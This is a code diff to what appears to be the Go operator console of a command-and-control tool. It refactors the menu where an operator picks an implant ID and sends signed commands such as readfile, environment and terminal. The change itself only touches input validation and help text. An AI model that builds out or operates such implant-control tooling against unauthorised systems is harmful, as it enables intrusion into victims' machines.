@@ -62,7 +62,7 @@ type impInfoStruct struct {
 }
 
 var cmd_list = []string{"pwd", "gcu", "rc", "rd", "terminal", "groups", "pid", "groupsid", "readfile", "environment",
-	"setenv", "chdir", "change_get", "fing"}
+	"setenv", "chdir", "change_get", "fing", "exit", "help"}
 
 func ifXinY(test string, list []string) bool {
 	for _, check := range list {
@@ -858,9 +858,8 @@ func main() {
 				}
 
 			case input == "4":
-				input = ""
 
-				var cmd, uuid string
+				var cmd_in, uuid string
 				fmt.Printf("This is the menu for interacting with implants \n")
 				fmt.Printf("This requires an implant ID to assign the command to \n")
 				fmt.Printf("Once you've specified an implant ID, you then can enter in your command \n")
@@ -878,25 +877,24 @@ func main() {
 				fmt.Println("Press enter or type 'help' to see the command help menu")
 				det := true
 				for det {
-					fmt.Printf("%sCommand > %s", red, reset)
 					reader := bufio.NewReader(os.Stdin)
-					cmd, _ = reader.ReadString('\n')
-					cmd = strings.ToLower(cmd)
+					fmt.Printf("%sCommand > %s", red, reset)
+					cmd_in, _ = reader.ReadString('\n')
+					cmd := strings.ToLower(cmd_in)
 					cmd = strings.ReplaceAll(cmd, "\n", "")
-					isEmpty2 := empty(cmd)
+
+					cmd_check := ifXinY(cmd, cmd_list)
+
 					switch {
-					case isEmpty2:
+					case cmd_in == "\n":
+						fmt.Print(cmdHelp)
+					case !cmd_check:
 						fmt.Print(cmdHelp)
 					case cmd == "exit":
 						det = false
 					case cmd == "help":
 						fmt.Print(cmdHelp)
 					default:
-						cmd_check := ifXinY(cmd, cmd_list)
-						if !cmd_check {
-							fmt.Println("Invalid command")
-							break
-						}
 						sig, err := sign(cmd)
 						if err != nil {
 							fmt.Print(err)
